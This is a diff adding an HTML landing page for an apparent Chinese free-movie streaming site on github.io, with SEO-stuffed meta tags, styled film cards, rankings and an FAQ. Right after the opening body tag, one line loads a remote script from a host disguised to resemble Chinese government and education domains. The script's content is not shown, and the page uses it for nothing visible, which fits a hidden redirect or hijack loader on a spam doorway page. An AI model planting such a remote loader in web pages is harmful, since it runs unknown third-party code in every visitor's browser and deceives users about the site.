@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>久久久电影网 - 经典老电影长长久久，高清电影电视剧在线观看</title>
+<meta name="description" content="久久久电影网 - 专注经典老片与长情好剧的在线观看平台。高清电影、热播剧集、怀旧港片、老片修复，久久珍藏每一部值得反复看的影视佳作。">
+<meta name="keywords" content="久久久电影网,jiujiujiudianyingwang-wap,经典老电影,高清电影在线观看,热播剧集,怀旧港片,老片修复,中文字幕">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="bingbot" content="index,follow">
+<link rel="canonical" href="https://jiujiujiudianyingwang-wap.github.io">
+<meta property="og:title" content="久久久电影网 - 经典老电影长长久久，高清电影电视剧在线观看">
+<meta property="og:description" content="专注经典老片与长情好剧，久久珍藏每一部值得反复看的影视佳作。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jiujiujiudianyingwang-wap.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="久久久电影网 - 经典老电影长长久久">
+<meta name="twitter:description" content="高清电影电视剧在线观看，久久珍藏每一部好片。">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#1a1024;
+  --ink2:#241630;
+  --plum:#3a1f4d;
+  --gold:#c9a227;
+  --gold-light:#e6c861;
+  --rose:#a8426f;
+  --cream:#f4ecdf;
+  --cream2:#ebe0cc;
+  --line:rgba(201,162,39,.28);
+  --line2:rgba(255,255,255,.10);
+  --shadow:0 18px 50px rgba(26,16,36,.45);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--ink);
+  color:var(--cream);
+  line-height:1.75;
+  overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 12% 8%, rgba(168,66,111,.16), transparent 42%),
+    radial-gradient(circle at 88% 92%, rgba(201,162,39,.10), transparent 45%),
+    repeating-linear-gradient(0deg, rgba(255,255,255,.012) 0 1px, transparent 1px 4px);
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+ul{list-style:none}
+
+/* ============ 布局 ============ */
+.wrap{max-width:1200px;margin:0 auto;padding:0 28px}
+
+/* ============ 顶部 ============ */
+.topbar{
+  background:linear-gradient(90deg,var(--ink),var(--plum),var(--ink));
+  border-bottom:1px solid var(--line);
+  font-size:13px;
+  letter-spacing:.06em;
+}
+.topbar .wrap{display:flex;justify-content:space-between;align-items:center;height:40px;gap:16px}
+.topbar span{color:var(--cream2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.topbar em{color:var(--gold);font-style:normal;font-weight:600}
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:rgba(26,16,36,.92);
+  backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line2);
+}
+.nav .wrap{display:flex;align-items:center;height:70px;gap:40px}
+.logo{
+  font-size:25px;font-weight:800;letter-spacing:.02em;flex-shrink:0;
+  background:linear-gradient(135deg,var(--gold-light),var(--gold));
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.logo i{font-style:normal;color:var(--rose);-webkit-text-fill-color:var(--rose)}
+.menu{display:flex;gap:6px;flex-wrap:wrap;margin-left:auto}
+.menu a{
+  padding:8px 15px;border-radius:8px;font-size:14px;color:var(--cream2);
+  border:1px solid transparent;transition:.25s;white-space:nowrap;
+}
+.menu a:hover{border-color:var(--line);color:var(--gold-light);background:rgba(201,162,39,.08)}
+.mbtn{
+  display:none;flex-direction:column;gap:5px;cursor:pointer;padding:8px;
+  border:1px solid var(--line);border-radius:8px;
+}
+.mbtn b{width:22px;height:2px;background:var(--gold-light);border-radius:2px}
+.menu.open{display:flex}
+
+/* ============ 通用标题 ============ */
+.sec{padding:88px 0}
+.sec:nth-child(even){background:linear-gradient(180deg,rgba(58,31,77,.18),rgba(26,16,36,.18))}
+.stitle{display:flex;align-items:flex-end;gap:18px;margin-bottom:48px;flex-wrap:wrap}
+.stitle .num{
+  font-size:56px;font-weight:800;line-height:.9;color:transparent;
+  -webkit-text-stroke:1.5px var(--gold);flex-shrink:0;
+}
+.stitle .txt h2{font-size:clamp(22px,3vw,32px);color:var(--cream);letter-spacing:.02em}
+.stitle .txt p{font-size:14px;color:var(--cream2);margin-top:4px}
+.stitle .line{flex:1;height:2px;background:linear-gradient(90deg,var(--gold),transparent);min-width:80px;margin-bottom:12px}
+
+/* ============ 首屏 ============ */
+.hero{
+  min-height:90vh;display:flex;align-items:center;position:relative;padding:80px 0;
+}
+.hero::before{
+  content:"";position:absolute;inset:0;
+  background:
+    radial-gradient(ellipse 60% 80% at 30% 40%, rgba(168,66,111,.20), transparent 60%),
+    radial-gradient(ellipse 70% 90% at 80% 70%, rgba(201,162,39,.10), transparent 55%);
+  pointer-events:none;
+}
+.hero .wrap{position:relative;z-index:2;width:100%}
+.hero-tag{
+  display:inline-flex;align-items:center;gap:10px;
+  padding:7px 18px;border:1px solid var(--gold);border-radius:40px;
+  font-size:13px;color:var(--gold-light);margin-bottom:26px;
+}
+.hero-tag::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--rose);box-shadow:0 0 12px var(--rose)}
+.hero h1{
+  font-size:clamp(32px,6vw,68px);line-height:1.16;font-weight:800;max-width:14em;
+}
+.hero h1 b{color:var(--gold-light);font-weight:800}
+.hero h1 em{color:var(--rose);font-style:normal}
+.hero-sub{
+  margin-top:24px;max-width:34em;font-size:clamp(15px,1.6vw,18px);color:var(--cream2);
+}
+.hero-acts{display:flex;gap:16px;margin-top:36px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:14px 30px;border-radius:10px;font-size:15px;font-weight:600;transition:.25s;cursor:pointer;border:0;
+}
+.btn-main{background:linear-gradient(135deg,var(--gold),var(--rose));color:#fff;box-shadow:0 10px 28px rgba(168,66,111,.35)}
+.btn-main:hover{transform:translateY(-3px);box-shadow:0 16px 36px rgba(168,66,111,.45)}
+.btn-line{background:transparent;color:var(--gold-light);border:1px solid var(--gold)}
+.btn-line:hover{background:rgba(201,162,39,.12)}
+.hero-stats{
+  display:flex;gap:0;margin-top:52px;border:1px solid var(--line);border-radius:14px;overflow:hidden;max-width:640px;flex-wrap:wrap;
+  background:rgba(36,22,48,.5);
+}
+.hero-stats div{flex:1;min-width:120px;padding:20px 18px;border-right:1px solid var(--line2)}
+.hero-stats div:last-child{border-right:0}
+.hero-stats strong{display:block;font-size:28px;color:var(--gold-light);font-weight:800}
+.hero-stats span{font-size:12px;color:var(--cream2);letter-spacing:.1em}
+
+/* ============ 栏一 时间胶囊 ============ */
+.capsule{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.card{
+  position:relative;border-radius:16px;overflow:hidden;background:var(--ink2);
+  border:1px solid var(--line2);box-shadow:var(--shadow);transition:.35s;
+}
+.card:hover{transform:translateY(-8px);border-color:var(--gold)}
+.card .cv{position:relative;aspect-ratio:4/3;overflow:hidden}
+.card .cv img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.card:hover .cv img{transform:scale(1.08)}
+.card .seal{
+  position:absolute;top:14px;left:14px;width:52px;height:52px;border-radius:50%;
+  background:var(--rose);color:#fff;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;font-size:9px;line-height:1.1;
+  border:2px solid rgba(255,255,255,.6);box-shadow:0 6px 18px rgba(0,0,0,.4);
+}
+.card .seal b{font-size:15px;font-weight:800;letter-spacing:0}
+.card .info{padding:20px}
+.card .info .kicker{display:inline-block;font-size:11px;letter-spacing:.16em;color:var(--gold);text-transform:uppercase}
+.card h3{font-size:19px;margin:8px 0 10px;color:var(--cream)}
+.card .meta{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
+.card .meta i{
+  font-style:normal;font-size:12px;padding:3px 10px;border-radius:20px;
+  background:rgba(201,162,39,.14);color:var(--gold-light);border:1px solid var(--line);
+}
+.card .info p{font-size:13.5px;color:var(--cream2);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+/* ============ 栏二 频道（印章形编号） ============ */
+.channels{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.chan{
+  display:flex;gap:18px;align-items:flex-start;padding:22px;
+  border:1px solid var(--line2);border-radius:14px;background:rgba(36,22,48,.45);transition:.3s;
+}
+.chan:hover{border-color:var(--gold);background:rgba(201,162,39,.08);transform:translateX(6px)}
+.chan .stamp{
+  width:56px;height:56px;flex-shrink:0;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:20px;font-weight:800;color:#fff;
+  background:var(--plum);border:2px solid var(--gold);
+  box-shadow:inset 0 0 0 4px var(--ink2);
+}
+.chan:nth-child(2) .stamp{background:var(--rose)}
+.chan:nth-child(3) .stamp{background:#6b4a2a}
+.chan:nth-child(4) .stamp{background:#3a4d6b}
+.chan:nth-child(5) .stamp{background:#4a2a4d}
+.chan:nth-child(6) .stamp{background:#2a4d42}
+.chan h3{font-size:17px;color:var(--cream);margin-bottom:5px}
+.chan p{font-size:13px;color:var(--cream2);line-height:1.6}
+
+/* ============ 栏三 胶片刻度榜 ============ */
+.chart{display:flex;flex-direction:column;gap:14px}
+.bar{
+  display:grid;grid-template-columns:56px 1.4fr 2fr 76px;align-items:center;gap:18px;
+  padding:14px 18px;border:1px solid var(--line2);border-radius:12px;background:rgba(36,22,48,.45);transition:.3s;
+}
+.bar:hover{border-color:var(--gold);background:rgba(201,162,39,.08)}
+.bar .rk{
+  font-size:26px;font-weight:800;color:var(--gold);text-align:center;
+  font-family:Georgia,"Times New Roman",serif;
+}
+.bar .rk.top{color:var(--rose)}
+.bar .nm h4{font-size:16px;color:var(--cream)}
+.bar .nm small{font-size:12px;color:var(--cream2)}
+.bar .track{position:relative;height:10px;border-radius:6px;background:rgba(255,255,255,.08);overflow:hidden}
+.bar .track i{position:absolute;left:0;top:0;height:100%;width:0;border-radius:6px;
+  background:linear-gradient(90deg,var(--plum),var(--rose),var(--gold));
+  transition:width 1.2s cubic-bezier(.22,1,.36,1)}
+.bar .sc{text-align:right;font-size:15px;font-weight:700;color:var(--gold-light)}
+
+/* ============ 栏四 专题（阶梯） ============ */
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:0;align-items:start}
+.step{
+  position:relative;padding:30px 26px;border:1px solid var(--line2);background:var(--ink2);transition:.35s;
+}
+.step:nth-child(1){transform:translateY(0)}
+.step:nth-child(2){transform:translateY(28px)}
+.step:nth-child(3){transform:translateY(56px)}
+.step:hover{transform:translateY(-8px);z-index:3;border-color:var(--gold)}
+.step .no{font-size:13px;letter-spacing:.2em;color:var(--gold);margin-bottom:12px}
+.step .cv{aspect-ratio:16/10;border-radius:10px;overflow:hidden;margin-bottom:18px}
+.step .cv img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.step:hover .cv img{transform:scale(1.06)}
+.step h3{font-size:19px;margin-bottom:8px;color:var(--cream)}
+.step p{font-size:13.5px;color:var(--cream2)}
+
+/* ============ 栏五 札记（竖排编号） ============ */
+.notes{display:grid;grid-template-columns:repeat(2,1fr);gap:24px}
+.note{
+  display:flex;gap:22px;padding:22px;border:1px solid var(--line2);border-radius:14px;
+  background:rgba(36,22,48,.4);transition:.3s;
+}
+.note:hover{border-color:var(--gold);background:rgba(201,162,39,.07)}
+.note .vno{
+  width:44px;height:60px;flex-shrink:0;border-radius:8px;display:flex;align-items:center;
+  justify-content:center;font-size:22px;font-weight:800;color:var(--gold-light);
+  background:var(--plum);border:1px solid var(--line);writing-mode:vertical-rl;letter-spacing:.1em;
+}
+.note .body h4{font-size:17px;color:var(--cream);margin-bottom:6px}
+.note .body p{font-size:13.5px;color:var(--cream2);line-height:1.7}
+.note .body .dt{display:block;margin-top:10px;font-size:12px;color:var(--rose);letter-spacing:.08em}
+
+/* ============ 栏六 FAQ ============ */
+.faqs{display:flex;flex-direction:column;gap:12px}
+.faq{
+  border:1px solid var(--line2);border-radius:12px;overflow:hidden;background:rgba(36,22,48,.45);transition:.3s;
+}
+.faq[open]{border-color:var(--gold)}
+.faq summary{
+  display:flex;align-items:center;gap:16px;padding:18px 22px;cursor:pointer;list-style:none;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary .qno{
+  width:34px;height:34px;flex-shrink:0;border-radius:8px;display:flex;align-items:center;justify-content:center;
+  font-size:14px;font-weight:700;color:var(--ink);background:var(--gold);
+}
+.faq summary .qt{flex:1;font-size:16px;color:var(--cream)}
+.faq summary .ar{
+  width:26px;height:26px;flex-shrink:0;border-radius:50%;border:1px solid var(--gold);
+  display:flex;align-items:center;justify-content:center;color:var(--gold-light);font-size:14px;transition:.3s;
+}
+.faq[open] summary .ar{transform:rotate(45deg);background:var(--gold);color:var(--ink)}
+.faq .ans{padding:0 22px 22px 72px;font-size:14px;color:var(--cream2);line-height:1.85}
+
+/* ============ 页脚 ============ */
+footer{border-top:1px solid var(--line);background:#130a1c;padding:56px 0 28px}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.foot h5{font-size:15px;color:var(--gold-light);margin-bottom:16px;letter-spacing:.06em}
+.foot ul{display:flex;flex-direction:column;gap:9px}
+.foot a{font-size:13.5px;color:var(--cream2);transition:.2s}
+.foot a:hover{color:var(--gold-light)}
+.foot .brand p{font-size:13.5px;color:var(--cream2);margin-top:14px;line-height:1.8}
+.copyright{
+  border-top:1px solid var(--line2);padding-top:24px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;
+  font-size:12.5px;color:var(--cream2);
+}
+
+/* ============ 响应式 ============ */
+@media (max-width:1000px){
+  .capsule,.channels,.steps{grid-template-columns:repeat(2,1fr)}
+  .step:nth-child(2),.step:nth-child(3){transform:none}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media (max-width:860px){
+  .wrap{padding:0 20px}
+  .sec{padding:64px 0}
+  .mbtn{display:flex}
+  .menu{
+    display:none;position:absolute;top:70px;left:0;right:0;flex-direction:column;
+    background:var(--ink2);padding:16px 20px;border-bottom:1px solid var(--line2);
+  }
+  .menu a{padding:12px 14px}
+  .notes{grid-template-columns:1fr}
+  .bar{grid-template-columns:44px 1fr 64px;gap:12px}
+  .bar .track{grid-column:1/-1;margin-top:4px}
+  .hero-stats{flex-direction:column}
+  .hero-stats div{border-right:0;border-bottom:1px solid var(--line2)}
+  .hero-stats div:last-child{border-bottom:0}
+}
+@media (max-width:600px){
+  .capsule,.channels,.steps,.foot{grid-template-columns:1fr}
+  .stitle .num{font-size:42px}
+  .hero h1{font-size:32px}
+  .hero-acts .btn{flex:1;text-align:center;justify-content:center}
+  .nav .wrap{height:62px;gap:16px}
+  .logo{font-size:21px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- 顶部条 -->
+<div class="topbar">
+  <div class="wrap">
+    <span>久久久久久 · 一部好片 <em>值得反复看</em> · 经典老电影永久珍藏</span>
+    <span>网址：jiujiujiudianyingwang-wap.github.io</span>
+  </div>
+</div>
+
+<!-- 导航 -->
+<nav class="nav">
+  <div class="wrap">
+    <div class="logo">久久<em>久</em>电影网</div>
+    <div class="mbtn" onclick="document.getElementById('menu').classList.toggle('open')"><b></b><b></b><b></b></div>
+    <div class="menu" id="menu">
+      <a href="#hero">首页</a>
+      <a href="#films">经典片单</a>
+      <a href="#chan">频道导航</a>
+      <a href="#chart">热播榜单</a>
+      <a href="#topic">专题精选</a>
+      <a href="#note">观影札记</a>
+      <a href="#faq">常见问题</a>
+    </div>
+  </div>
+</nav>
+
+<!-- 首屏 -->
+<header class="hero" id="hero">
+  <div class="wrap">
+    <div class="hero-tag">久久珍藏 · 长情好片</div>
+    <h1>好电影 <b>越久越香</b><br>久久<em>久</em>陪你把经典 <b>看透</b></h1>
+    <p class="hero-sub">久久久电影网专注经典老片与长情好剧的在线观看。从黑白老片到修复版高清影视，久久珍藏每一部值得反复回味、跨越时间依然动人的佳作。</p>
+    <div class="hero-acts">
+      <a class="btn btn-main" href="#films">开启经典片单 →</a>
+      <a class="btn btn-line" href="#chart">查看热播榜单</a>
+    </div>
+    <div class="hero-stats">
+      <div><strong>9999+</strong><span>经典馆藏</span></div>
+      <div><strong>720P/1080P</strong><span>高清画质</span></div>
+      <div><strong>永久免费</strong><span>在线观看</span></div>
+      <div><strong>中文字幕</strong><span>完整配音</span></div>
+    </div>
+  </div>
+</header>
+
+<!-- 栏一：经典片单 -->
+<section class="sec" id="films">
+  <div class="wrap">
+    <div class="stitle">
+      <div class="num">壹</div>
+      <div class="txt">
+        <h2>经典片单 · 时间胶囊</h2>
+        <p>被岁月筛选过的好片，久久不忘</p>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="capsule">
+      <article class="card">
+        <div class="cv">
+          <img src="https://images.unsplash.com/photo-1485846234645-a62644f84728?w=600&q=80" alt="老电影修复版胶片画面">
+          <div class="seal"><b>壹</b><span>壹号胶囊</span></div>
+        </div>
+        <div class="info">
+          <span class="kicker">Restored Classic</span>
+          <h3>老电影修复版精选</h3>
+          <div class="meta"><i>4K修复</i><i>黑白转彩</i><i>中字</i></div>
+          <p>历经岁月依然动人的经典老片，修复后细节重生，是久久久电影网馆藏里的常青之作。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="cv">
+          <img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=600&q=80" alt="怀旧港片剧场">
+          <div class="seal"><b>贰</b><span>贰号胶囊</span></div>
+        </div>
+        <div class="info">
+          <span class="kicker">Hong Kong Cinema</span>
+          <h3>怀旧港片长卷</h3>
+          <div class="meta"><i>港片</i><i>动作</i><i>喜剧</i></div>
+          <p>从黄金年代到新浪潮，港片的热血与浪漫被久久珍藏，每一部都值得再看一遍。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="cv">
+          <img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=600&q=80" alt="经典爱情片剧照">
+          <div class="seal"><b>叁</b><span>叁号胶囊</span></div>
+        </div>
+        <div class="info">
+          <span class="kicker">Eternal Love</span>
+          <h3>经典爱情片重温</h3>
+          <div class="meta"><i>爱情</i><i>剧情</i><i>治愈</i></div>
+          <p>跨越时代的深情故事，久久久电影网为你留住那些让人心头一暖的银幕瞬间。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="cv">
+          <img src="https://images.unsplash.com/photo-1574267432553-4b4628081c31?w=600&q=80" alt="年代剧集海报">
+          <div class="seal"><b>肆</b><span>肆号胶囊</span></div>
+        </div>
+        <div class="info">
+          <span class="kicker">Long Drama</span>
+          <h3>长情剧集连播</h3>
+          <div class="meta"><i>国产剧</i><i>年代</i><i>家庭</i></div>
+          <p>一集接一集停不下来，长情剧集陪伴久久的闲暇时光，适合慢慢追、细细品。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="cv">
+          <img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=600&q=80" alt="胶片放映机">
+          <div class="seal"><b>伍</b><span>伍号胶囊</span></div>
+        </div>
+        <div class="info">
+          <span class="kicker">Film Archive</span>
+          <h3>胶片档案室</h3>
+          <div class="meta"><i>纪录片</i><i>文艺</i><i>小众</i></div>
+          <p>那些被时间掩埋的小众佳作，在久久久电影网的胶片档案室里等你重新发现。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="cv">
+          <img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?w=600&q=80" alt="露天电影放映">
+          <div class="seal"><b>陆</b><span>陆号胶囊</span></div>
+        </div>
+        <div class="info">
+          <span class="kicker">Open Air</span>
+          <h3>露天电影夜</h3>
+          <div class="meta"><i>合家欢</i><i>动画</i><i>经典</i></div>
+          <p>像小时候的夏夜一样，久久久陪你重温那些一家人围坐一起看的温暖老电影。</p>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏二：频道导航 -->
+<section class="sec" id="chan">
+  <div class="wrap">
+    <div class="stitle">
+      <div class="num">贰</div>
+      <div class="txt">
+        <h2>频道导航 · 印章索引</h2>
+        <p>六大频道，按喜好各取所需</p>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="channels">
+      <a class="chan" href="#">
+        <div class="stamp">壹</div>
+        <div><h3>经典老电影</h3><p>百年影史精华，久久不褪色。</p></div>
+      </a>
+      <a class="chan" href="#">
+        <div class="stamp">贰</div>
+        <div><h3>热播剧集</h3><p>当下最火好剧，一次追到爽。</p></div>
+      </a>
+      <a class="chan" href="#">
+        <div class="stamp">叁</div>
+        <div><h3>怀旧港片</h3><p>黄金年代港片，热血浪漫并存。</p></div>
+      </a>
+      <a class="chan" href="#">
+        <div class="stamp">肆</div>
+        <div><h3>修复专区</h3><p>4K 修复老片，细节重生。</p></div>
+      </a>
+      <a class="chan" href="#">
+        <div class="stamp">伍</div>
+        <div><h3>经典动画</h3><p>童年回忆动画，全年龄珍藏。</p></div>
+      </a>
+      <a class="chan" href="#">
+        <div class="stamp">陆</div>
+        <div><h3>纪录片档案</h3><p>真实影像记录，值得久久回味。</p></div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏三：热播榜单 -->
+<section class="sec" id="chart">
+  <div class="wrap">
+    <div class="stitle">
+      <div class="num">叁</div>
+      <div class="txt">
+        <h2>热播榜单 · 久久热度</h2>
+        <p>被反复观看的，才是真经典</p>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="chart">
+      <div class="bar"><div class="rk top">壹</div><div class="nm"><h4>岁月如歌 · 经典修复版</h4><small>经典老电影 / 修复专区</small></div><div class="track"><i data-w="96"></i></div><div class="sc">9.6</div></div>
+      <div class="bar"><div class="rk top">贰</div><div class="nm"><h4>港片黄金年代合集</h4><small>怀旧港片 / 动作喜剧</small></div><div class="track"><i data-w="94"></i></div><div class="sc">9.4</div></div>
+      <div class="bar"><div class="rk top">叁</div><div class="nm"><h4>长情年代剧 · 久久追更</h4><small>热播剧集 / 家庭年代</small></div><div class="track"><i data-w="92"></i></div><div class="sc">9.2</div></div>
+      <div class="bar"><div class="rk">肆</div><div class="nm"><h4>黑白光影档案</h4><small>经典老电影 / 文艺</small></div><div class="track"><i data-w="89"></i></div><div class="sc">8.9</div></div>
+      <div class="bar"><div class="rk">伍</div><div class="nm"><h4>童年动画重温</h4><small>经典动画 / 合家欢</small></div><div class="track"><i data-w="87"></i></div><div class="sc">8.7</div></div>
+      <div class="bar"><div class="rk">陆</div><div class="nm"><h4>真实纪录片 · 时光印记</h4><small>纪录片档案</small></div><div class="track"><i data-w="84"></i></div><div class="sc">8.4</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏四：专题精选 -->
+<section class="sec" id="topic">
+  <div class="wrap">
+    <div class="stitle">
+      <div class="num">肆</div>
+      <div class="txt">
+        <h2>专题精选 · 拾级而上</h2>
+        <p>三档专题，层层深入好片世界</p>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="steps">
+      <article class="step">
+        <div class="no">专题 · 壹</div>
+        <div class="cv"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=600&q=80" alt="胶片修复专题"></div>
+        <h3>胶片修复计划</h3>
+        <p>把被时间模糊的老电影一帧帧擦亮，让经典在久久久电影网重获新生。</p>
+      </article>
+      <article class="step">
+        <div class="no">专题 · 贰</div>
+        <div class="cv"><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=600&q=80" alt="港片专题"></div>
+        <h3>港片黄金年代</h3>
+        <p>从警匪到喜剧，港片的热血与浪漫，是久久久馆藏里最鲜活的记忆。</p>
+      </article>
+      <article class="step">
+        <div class="no">专题 · 叁</div>
+        <div class="cv"><img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?w=600&q=80" alt="合家欢专题"></div>
+        <h3>一家人的电影夜</h3>
+        <p>适合全家围坐的温暖老片，让好电影成为久久陪伴的家庭时光。</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏五：观影札记 -->
+<section class="sec" id="note">
+  <div class="wrap">
+    <div class="stitle">
+      <div class="num">伍</div>
+      <div class="txt">
+        <h2>观影札记 · 久久回响</h2>
+        <p>把每一次心动，记成可以回看的文字</p>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="notes">
+      <article class="note">
+        <div class="vno">札壹</div>
+        <div class="body">
+          <h4>为什么老电影越看越有味道</h4>
+          <p>没有炫目的特效，只有扎实的剧本与表演。久久久电影网的修复专区，让你看见当年被忽略的细节与克制之美。</p>
+          <span class="dt">— 久久影评人 · 于胶片档案室</span>
+        </div>
+      </article>
+      <article class="note">
+        <div class="vno">札贰</div>
+        <div class="body">
+          <h4>港片里的江湖与情义</h4>
+          <p>几代人共同的银幕记忆。再看一遍，你会在久久久电影网发现年轻时没看懂的取舍与遗憾。</p>
+          <span class="dt">— 影迷手记 · 港片频道</span>
+        </div>
+      </article>
+      <article class="note">
+        <div class="vno">札叁</div>
+        <div class="body">
+          <h4>长情剧集的陪伴感</h4>
+          <p>好剧像老朋友，久不久回来坐坐就很安心。久久久整理的长情剧集，专为慢慢追、细细品而设。</p>
+          <span class="dt">— 编辑部 · 热播榜旁</span>
+        </div>
+      </article>
+      <article class="note">
+        <div class="vno">札肆</div>
+        <div class="body">
+          <h4>把经典传给下一代</h4>
+          <p>合家欢专场里，每一部都是可以和孩子同看的安心之选。好电影的寿命，远比我们想象的更久久。</p>
+          <span class="dt">— 久久推荐 · 合家欢频道</span>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏六：常见问题 -->
+<section class="sec" id="faq">
+  <div class="wrap">
+    <div class="stitle">
+      <div class="num">陆</div>
+      <div class="txt">
+        <h2>常见问题 · 久久答疑</h2>
+        <p>关于久久久电影网，你想知道的都在这里</p>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="faqs">
+      <details class="faq" open>
+        <summary><span class="qno">壹</span><span class="qt">久久久电影网主要看什么类型的片？</span><span class="ar">＋</span></summary>
+        <div class="ans">久久久电影网聚焦经典老电影、热播剧集、怀旧港片、修复专区与合家欢动画，主打「值得反复看」的长情好片，中文字幕、高清在线观看。</div>
+      </details>
+      <details class="faq">
+        <summary><span class="qno">贰</span><span class="qt">老片修复版的画质怎么样？</span><span class="ar">＋</span></summary>
+        <div class="ans">久久久的修复专区提供 720P/1080P 高清画质，部分馆藏支持 4K 修复版本，画面细节与音轨均经过重新处理，观感远胜原始片源。</div>
+      </details>
+      <details class="faq">
+        <summary><span class="qno">叁</span><span class="qt">所有影片都免费在线观看吗？</span><span class="ar">＋</span></summary>
+        <div class="ans">久久久电影网提供大量免费在线观看资源，无需下载即可播放，支持手机、平板、电脑多端自适应观看，随时随地打开就看。</div>
+      </details>
+      <details class="faq">
+        <summary><span class="qno">肆</span><span class="qt">有适合全家一起看的内容吗？</span><span class="ar">＋</span></summary>
+        <div class="ans">有。合家欢频道精选经典动画与全年龄向老电影，画面与内容都适合亲子同看，是久久久电影网最受欢迎的频道之一。</div>
+      </details>
+      <details class="faq">
+        <summary><span class="qno">伍</span><span class="qt">新片多久更新一次？</span><span class="ar">＋</span></summary>
+        <div class="ans">久久久每日更新热播榜单与片单，经典馆藏持续扩充。修复专区每月新增若干部 4K 修复老片，值得长期关注。</div>
+      </details>
+      <details class="faq">
+        <summary><span class="qno">陆</span><span class="qt">在手机上看会自适应吗？</span><span class="ar">＋</span></summary>
+        <div class="ans">会的。久久久电影网全站采用响应式设计，从大屏到小屏都能自动适配，海报墙、榜单、专题与问答栏目均做了移动端优化。</div>
+      </details>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="brand">
+        <div class="logo">久久<em>久</em>电影网</div>
+        <p>久久珍藏每一部值得反复看的影视佳作。经典老电影、热播剧集、怀旧港片、修复专区，久久陪伴你的观影时光。</p>
+      </div>
+      <div>
+        <h5>频道导览</h5>
+        <ul>
+          <li><a href="#">经典老电影</a></li>
+          <li><a href="#">热播剧集</a></li>
+          <li><a href="#">怀旧港片</a></li>
+          <li><a href="#">修复专区</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>专题栏目</h5>
+        <ul>
+          <li><a href="#">胶片修复计划</a></li>
+          <li><a href="#">港片黄金年代</a></li>
+          <li><a href="#">合家欢电影夜</a></li>
+          <li><a href="#">纪录片档案</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于久久久</h5>
+        <ul>
+          <li><a href="#">关于我们</a></li>
+          <li><a href="#">观影札记</a></li>
+          <li><a href="#">常见问题</a></li>
+          <li><a href="#">网站地图</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      <span>© 2026 久久久电影网 · jiujiujiudianyingwang-wap.github.io · 久久珍藏经典影视</span>
+      <span>本站内容仅供影视推荐与信息分享，具体观看请以官方渠道为准。</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+// 榜单进度条动画
+const tracks=document.querySelectorAll('.bar .track i');
+const io=new IntersectionObserver((es)=>{
+  es.forEach(e=>{
+    if(e.isIntersecting){
+      const w=e.target.getAttribute('data-w');
+      e.target.style.width=w+'%';
+      io.unobserve(e.target);
+    }
+  });
+},{threshold:.3});
+tracks.forEach(t=>{t.style.width='0%';io.observe(t);});
+// 移动端菜单点击关闭
+document.querySelectorAll('.menu a').forEach(a=>{
+  a.addEventListener('click',()=>document.getElementById('menu').classList.remove('open'));
+});
+</script>
+
+<script type="application/ld+json">
+{
